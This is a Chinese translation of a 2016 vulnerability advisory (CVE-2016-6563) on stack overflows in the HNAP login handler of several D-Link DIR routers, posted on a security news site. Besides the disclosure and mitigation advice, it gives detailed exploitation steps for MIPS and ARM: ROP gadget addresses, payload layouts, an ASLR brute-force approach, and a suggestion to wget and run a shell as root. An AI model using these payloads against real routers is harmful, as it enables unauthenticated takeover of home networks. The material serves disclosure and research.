# 【漏洞分析】Dlink DIR路由器HNAP登录函数的多个漏洞

阅读量 **311597**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2016-11-15 13:54:31

 **x**

##### 译文声明

本文是翻译文章，文章来源：githubusercontent

原文地址：<https://raw.githubusercontent.com/pedrib/PoC/master/advisories/dlink-hnap-login.txt>

译文仅供参考，具体内容表达以及含义原文为准。

****

****

**翻译：**[ **Ox9A82**](http://bobao.360.cn/member/contribute?uid=2676915949)

**稿费：180RMB（不服你也来投稿啊！）**

**投稿方式：发送邮件至linwei#360.cn，或登陆**[
**网页版**](http://bobao.360.cn/contribute/index) **在线投稿**

**受影响产品的背景**

智能手机，笔记本电脑，平板电脑，手机，智能电视，游戏机等设备都在同一时间进行连接。这就是为什么我们设计了新的AC3200 Ultra Wi-Fi路由器。通过Tri-Band技术，使得速度高达3.2Gbps，它提供了严苛环境下必要的超级性能，使得其成为最好的家庭无线路由器。

  

**概要**

Dlink路由器在LAN接口上存在一个名为HNAP（家庭网络管理协议）的协议。这是一种允许识别，配置和管理网络设备的SOAP协议。Dlink使用这个协议来实现通过LAN口与路由器的web接口进行通信。有关HNAP的更多信息，请参见[1]和[2]。

Dlink中的HNAP具有悠久的漏洞历史。Craig Heffner似乎发现了大量这种类型的漏洞（见[3]，[4]，[5]，[6]，[7]，[8]）。

当进行HNAP登录操作时，对SOAP消息内的XML标记进行处理时会触发此漏洞。受影响的函数包含两个栈溢出，这可以被未经验证的攻击者通过LAN进行利用。它影响了跨越ARM和MIPS体系结构的多个Dlink路由器。
Metasploit为这两种架构设计的漏洞利用模块已经发布[9]。

特别感谢CERT/CC和Trent Novelly帮助向供应商披露此漏洞。更多的有关信息，请参阅CERT的建议[10]。

  

**技术细节**

**漏洞类型：** 栈溢出

**CVE编号：** CVE-2016-6563

**攻击向量：** 远程

**约束：** 可以被未经验证的攻击者利用。其他约束，请见下文。

**受影响的版本：** 以下MIPS设备已被确认为易受攻击

DIR-823

DIR-822

DIR-818L(W)

以下ARM设备已被确认为易受攻击

DIR-895L

DIR-890L

DIR-885L

DIR-880L

DIR-868L -> Rev. B and C only

可能存在有上面没有列出的其他受影响的设备。

  

**漏洞详细信息和MIPS环境的漏洞利用**

漏洞函数为parse_xml_value（这是我自己定义的名字，不是一个符号）被/htdocs/cgibin中的hnap_main（二进制中的符号）所调用。

这个函数有3个参数：第一个是接受的对象/字符串，第二个是在请求内部解析的XML标签名称，第三个是一个指针，指向了应该返回的标签值。

这个函数尝试在请求对象中查找标签名，然后获取标签的值，首先将其复制到本地变量，然后再复制到第三个参数中。此函数在执行HNAP登录操作时被hnap_main调用，用于从上述SOAP请求中获取Action，Username，LoginPassword和Catpcha的值。

    
    
    parse_xml_value(char* request, char* XMLtag, char* tag_value)
    (...)
    .text:00412264     xml_tag_value_start = $s2
    .text:00412264     xml_tag_value_end = $s1
    .text:00412264 C30                 addu    xml_tag_value_start, $v0, $s0  # s2 now points to <Action>$value</Action>
    .text:00412268 C30                 la      $t9, strstr
    .text:0041226C C30                 move    $a1, xml_tag_value_end  # needle
    .text:00412270 C30                 jalr    $t9 ; strstr
    .text:00412274 C30                 move    $a0, xml_tag_value_start  # haystack
    .text:00412278 C30                 lw      $gp, 0xC30+var_C20($sp)
    .text:0041227C C30                 beqz    $v0, loc_4122BC
    .text:00412280 C30                 subu    xml_tag_value_end, $v0, xml_tag_value_start  # s1 now holds the ptr to <Action>value$</Action>
    .text:00412284 C30                 bltz    xml_tag_value_end, loc_4122BC
    .text:00412288 C30                 addiu   $s0, $sp, 0xC30+xml_tag_var
    .text:0041228C C30                 la      $t9, strncpy
    .text:00412290 C30                 move    $a2, xml_tag_value_end  # n
    .text:00412294 C30                 move    $a1, xml_tag_value_start  # src
    .text:00412298 C30                 addu    xml_tag_value_end, $s0, xml_tag_value_end
    .text:0041229C C30                 jalr    $t9 ; strncpy    # copies all chars in <Action>$value$</Action> to xml_tag_var using strncpy
    .text:004122A0 C30                 move    $a0, $s0         # dest
    .text:004122A4 C30                 move    $a0, a2_ptr      # a2_ptr is a stack variable from hnap_main (passed as third argument to parse_xml_value)
    .text:004122A8 C30                 lw      $gp, 0xC30+var_C20($sp)
    .text:004122AC C30                 move    $a1, $s0         # src
    .text:004122B0 C30                 la      $t9, strcpy# copies xml_tag_var into a2_ptr using strcpy
    .text:004122B4 C30                 jalr    $t9 ; strcpy     # the stack of the calling function (hnap_main) is thrashed if 2408+ bytes are sent
    .text:004122B8 C30                 sb      $zero, 0(xml_tag_value_end)
    (...)

由于存在着两个溢出漏洞，因此我们有两个exp开发的选择：

1\.
本地堆栈（在parse_xml_value上）可以被超过3096字节的数据溢出。即使是使用了strncpy这种溢出也会发生，因为strncpy的参数只是对XML标签中的值进行strlen得到的。

2\.
或者，我们可以溢出调用函数（hnap_main）的堆栈，只需使用超过2408字节的数据即可。这是因为strcpy用于将xml_tag_var复制到由parse_xml_value接收的第三个参数，而它是一个指向hnap_main函数栈中局部变量的指针。

通过1. 进行利用要更容易一些，下面的例子将具体解释利用该如何进行。

所有受影响的MIPS设备使用相同版本的uClibc（libuClibc-0.9.30.3.so）并且都将其加载到0x2aabe000地址，这使得固件版本对利用来说并不重要。应该注意的是，MIPS设备使用基于Lextra
RLX5281核心的RTL8881a CPU。Lextra
RLX核心是MIPS的克隆版本，但它有一些缺陷，因为它们缺少一些加载和存储指令。由于这个原因，工作在MIPS上的一些通用shellcode可能无法工作在这些CPU（特别是经过混淆的）上。

这些设备不具有NX，ASLR或任何其他的现代内存保护机制，所以shellcode可以直接在堆栈上执行。但是，有必要通过ROP来设置堆栈以供执行，这可以通过libuClibc-0.9.30.3.so中的gadgets来实现。

由于MIPS
CPU的工作方式，因此有必要在执行exp之前清除CPU的高速缓存。这可以通过调用libc中sleep()函数来强制清除。（参考<http://blog.emaze.net/2011/10/exploiting-mips-embedded-devices.html>关于MIPS CPU缓存的解释）。

所以ROP链和shellcode看起来像：

    
    
    first_gadget - execute sleep and call second_gadget
    .text:0004EA1C                 move    $t9, $s0 <- sleep()
    .text:0004EA20                 lw      $ra, 0x20+var_4($sp) <- second_gadget
    .text:0004EA24                 li      $a0, 2 <- arg for sleep()
    .text:0004EA28                 lw      $s0, 0x20+var_8($sp)
    .text:0004EA2C                 li      $a1, 1
    .text:0004EA30                 move    $a2, $zero
    .text:0004EA34                 jr      $t9 
    .text:0004EA38                 addiu   $sp, 0x20
    second_gadget - puts stack pointer in a1:
    .text:0002468C                 addiu   $s1, $sp, 0x58
    .text:00024690                 li      $s0, 0x44
    .text:00024694                 move    $a2, $s0
    .text:00024698                 move    $a1, $s1
    .text:0002469C                 move    $t9, $s4
    .text:000246A0                 jalr    $t9
    .text:000246A4                 move    $a0, $s2
    third_gadget - call $a1 (which now has the stack pointer):
    .text:00041F3C                 move    $t9, $a1
    .text:00041F40                 move    $a1, $a2
    .text:00041F44                 addiu   $a0, 8
    .text:00041F48                 jr      $t9
    .text:00041F4C                 nop

当崩溃发生时，栈指针指向xml_tag_value[3128]。为了给shellcode留出更大的空间（3000+字节），可以跳到xml_tag_value[0]中。

    
    
    prep_shellcode_1 =  23bdf3c8 # addisp,sp,-3128
    prep_shellcode_2 =  03a0f809 # jalrsp
    branch_delay =  2084f830   # addia0,a0,-2000 (NOP executed as a MIPS branch delay slot)

最终的Action/Username/LoginPassword/Catpcha 的XML标签值将是：

    
    
    shellcode +'a'*（3072 - shellcode.size）+ sleep（）+'1'* 4 +'2'* 4 +'3'* 4 + third_gadget + first_gadget +'b'* 0x1c + second_gadget +'c '* 0x58 + prep_shellcode_1 + prep_shellcode_2 + branch_delay

'a'，'b'和'c'只是用于填充缓冲区的，而'1111'，'2222'和'3333'将是寄存器s1、s2、s3的值（这些寄存器对于exp是无用的），其余的是ROP链，shellcode和栈初始化程序。在payload中唯一不能发送的坏字节是空字节，因为这是一个str（n）cpy函数造成的溢出。最多可以发送3350个字符，因为超出之后很难去控制溢出的可靠性。注意，所有的这些利用的都是strncpy造成的第一个缓冲区溢出，但是第二个缓冲区溢出可以通过类似的方式进行利用。

如前面所述，由于使用了不完整的MIPS内核，因此在网上找到的通用shellcode可能会失败。可以通过做一些微小的工作来解决它，但是最好的方法是去制作一个可靠的shellcode。如果没有使用编码器的话，Metasploit生成的简单的bind
shell似乎就可以稳定的工作。

    
    
    -----------------------    ARM exploitation
    -----------------------    The same two stack overflows affect ARM, but require less bytes to overflow the stack. The following snippet is the same part of parse_xml_value as shown for MIPS (taken from firmware 2.03b01 for the DIR-868 Rev. B):
    .text:00018F34 C30 LDR             R1, [R11,#src] ; src
    .text:00018F38 C30 LDR             R2, [R11,#n] ; n
    .text:00018F3C C30 SUB             R3, R11, #-xml_tag_var
    .text:00018F40 C30 SUB             R3, R3, #4
    .text:00018F44 C30 SUB             R3, R3, #4
    .text:00018F48 C30 MOV             R0, R3  ; dest
    .text:00018F4C C30 BL              strncpy ; first overflow occurs here (xml_tag_var in parse_xml_stack) with 1024+ characters
    .text:00018F50 C30 MOV             R3, #0xFFFFFBEC
    .text:00018F58 C30 LDR             R2, [R11,#n]
    .text:00018F5C C30 SUB             R1, R11, #-var_4
    .text:00018F60 C30 ADD             R2, R1, R2
    .text:00018F64 C30 ADD             R3, R2, R3
    .text:00018F68 C30 MOV             R2, #0
    .text:00018F6C C30 STRB            R2, [R3] 
    .text:00018F70 C30 SUB             R3, R11, #-xml_tag_var
    .text:00018F74 C30 SUB             R3, R3, #4
    .text:00018F78 C30 SUB             R3, R3, #4
    .text:00018F7C C30 LDR             R0, [R11,#a2_ptr] ; a2_ptr is is a stack variable from hnap_main
    .text:00018F80 C30 MOV             R1, R3  ; src
    .text:00018F84 C30 BL              strcpy  ; second overflow occurs here

与MIPS的二进制文件相比，parse_xml_value和hnap_main的栈大小会变得更小。这一次，parse_xml_value中的strncpy溢出更容易被利用，只需要1024字节就足以溢出堆栈。与MIPS漏洞利用相同的是，唯一的坏字节是空字节。

受影响的ARM设备具有不可执行堆栈（NX）和32位ASLR的保护。 NX可以用ROP来关闭，而32位的ASLR很弱 –
地址中通常只有3个字节会发生变化，这意味着只有4096种可能。攻击需要执行多次，直到命中了正确的基地址，但这通常可以在少于1000次尝试中实现。

最容易进行的攻击是通过return-to-libc来调用system()函数执行命令。为此，R0在调用system()函数之前必须要指向命令所在的栈内存地址。所有受影响的ARM设备无论是何种固件版本的都使用相同的uClibc（libuClibc-0.9.32.1.so），这使得寻找gadgets更加容易，并允许构建一个可以在所有设备上使用的漏洞exp，并而无需进行任何修改。

    
    
    first_gadget (pops system() address into r3, and second_gadget into PC):
    .text:00018298                 LDMFD           SP!, {R3,PC}
    second_gadget (puts the stack pointer into r0 and calls system() at r3): 
    .text:00040CB8                 MOV             R0, SP
    .text:00040CBC                 BLX             R3
    system() (Executes argument in r0 (our stack pointer)
    .text:0005A270 system
    The final Action / Username / LoginPassword / Catpcha XML parameter value will be:
    'a' * 1024 + 0xffffffff + 'b' * 16 + 'AAAA' + first_gadget + system() + second_gadget + command
    a / b = filler
    0xffffffff = integer n (see below)
    AAAA = R11
    first_gadget = initial PC
    payload = stack points here after execution of our ROP chain; it should point to whatever we want system() to execute

当溢出发生时，栈上局部变量“n”被覆盖，这个局部变量是用于计算内存地址的（见0x18F58）。为了避免在shellcode执行之前该进程就发生崩溃，这个变量需要被设置为一个有效内存地址。一个比较好的候选值是0xffffffff，因为这将从计算的内存地址中减去1，以防止无效的内存访问。

从这一点出发，可以在payload中执行任何命令。例如，wget可以用于下载shell并执行，或者可以启动telnet服务器。所有命令将以root权限来执行。

**  
**

**修复建议**

Dlink并没有响应CERT的请求，因此在撰写本文时并没有可用的固件补丁。

鉴于此漏洞只能在LAN中进行利用，所以建议使用高强度的wifi密码，以防止不受信任的客户端连接到路由器。

  

**参考链接**

[1]
<https://isc.sans.edu//diary/More+on+HNAP+-+What+is+it,+How+to+Use+it,+How+to+Find+it/17648>

[2] <https://en.wikipedia.org/wiki/Home_Network_Administration_Protocol>

[3] <http://www.devttys0.com/2015/04/hacking-the-d-link-dir-890l/>

[4] <http://www.devttys0.com/2015/04/what-the-ridiculous-fuck-d-link/>

[5] <http://www.devttys0.com/2014/05/hacking-the-d-link-dsp-w215-smart-plug/>

[6] <https://packetstormsecurity.com/files/134370/D-Link-DIR-818W-Buffer-Overflow-Command-Injection.html>

[7] <https://dl.packetstormsecurity.net/papers/attack/dlink_hnap_captcha.pdf>

[8] <http://www.dlink.com/uk/en/support/support-news/2015/april/13/hnap-privilege-escalation-command-injection>

[9] <https://github.com/rapid7/metasploit-framework/pull/7543>

[10] <https://www.kb.cert.org/vuls/id/677427>

本文翻译自githubusercontent
[原文链接](https://raw.githubusercontent.com/pedrib/PoC/master/advisories/dlink-hnap-login.txt)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Ox9A82** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/84912](/post/id/84912)

安全客 - 有思想的安全新媒体

本文转载自:
[githubusercontent](https://raw.githubusercontent.com/pedrib/PoC/master/advisories/dlink-hnap-login.txt)

如若转载,请注明出处：
<https://raw.githubusercontent.com/pedrib/PoC/master/advisories/dlink-hnap-login.txt>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __3赞

 __收藏

![](https://p4.ssl.qhmsg.com/dm/200_200_100/t01ae2ab9a52b1881a6.jpg) Ox9A82

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

